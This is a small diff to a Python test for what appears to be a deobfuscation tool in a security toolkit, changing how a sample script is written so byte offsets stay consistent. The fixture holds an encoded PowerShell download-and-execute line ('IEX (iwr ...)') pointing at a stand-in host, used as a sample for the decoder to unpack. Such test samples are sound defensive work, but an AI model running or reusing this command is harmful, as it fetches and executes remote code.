@@ -219,7 +219,7 @@ def test_artefact_plage_et_ligne(tmp_path):
     enc = base64.b64encode('IEX (iwr http://p.example.com/s)'.encode('utf-16-le')).decode()
     content = f'ligne 1\nligne 2\npowershell -enc {enc}\nfin\n'
     p = tmp_path / 'script.ps1'
-    p.write_text(content)
+    p.write_bytes(content.encode('utf-8'))  # LF on every OS: offsets are byte offsets
     off = content.index('powershell')
     r = toolkit.run_tool('deobfuscate_artifact', {'file_path': str(p), 'offset': off, 'length': 200})
     assert r['line'] == 3 and 'http://p.example.com/s' in r['decoded'] and r['events'][0]['line'] == 3
